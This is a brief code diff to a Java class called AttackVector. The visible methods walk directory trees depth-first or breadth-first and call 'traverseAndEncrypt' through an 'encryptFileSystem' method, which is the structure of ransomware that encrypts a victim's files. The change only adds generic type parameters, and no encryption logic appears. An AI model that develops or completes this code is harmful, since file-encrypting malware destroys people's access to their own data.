@@ -10,13 +10,13 @@ import Agent.traversal.*;
 public class AttackVector {
 
 	public void attack(String inputDir, Collection<File> dirs, CryptoKey key) {
-		Traverse dfs = new DFS();
+		Traverse dfs = new DFS<File>();
 		dfs.traverseAndEncrypt(inputDir, dirs, key);
 		// or
-		Traverse bfs = new BFS();
+		Traverse bfs = new BFS<File>();
 		bfs.traverseAndEncrypt(inputDir, dirs, key);
 	}
-
+ 
 	public void encryptFileSystem(CryptoKey clientKey) throws Exception {
 
 		Collection<File> visitedFolders = Collections.emptySet();
